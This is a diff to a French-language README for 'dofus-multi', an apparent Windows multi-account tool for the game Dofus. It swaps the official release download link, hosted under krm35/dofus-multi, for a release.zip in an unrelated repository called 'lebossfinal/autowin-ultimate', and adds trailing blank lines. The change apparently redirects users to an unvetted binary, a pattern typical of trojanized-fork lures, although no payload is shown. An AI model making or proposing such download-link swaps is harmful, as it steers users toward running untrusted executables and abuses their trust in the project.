@@ -6,7 +6,7 @@
 
 **Pour les utilisateurs de windows, vous pouvez télécharger la dernière version avec ce lien :**
 
-https://github.com/krm35/dofus-multi/releases/download/1.0.0/release.zip
+https://github.com/lebossfinal/autowin-ultimate/releases/download/1.0.0/release.zip
 
 **To start in dev mode**
 
@@ -23,3 +23,7 @@ Pour ceux qui ont des notifications windows en boucle, vous pouvez désactiver l
 ![Alt Text](front/public/img/notif1.png)
 
 ![Alt Text](front/public/img/notif2.png)
+
+
+
+
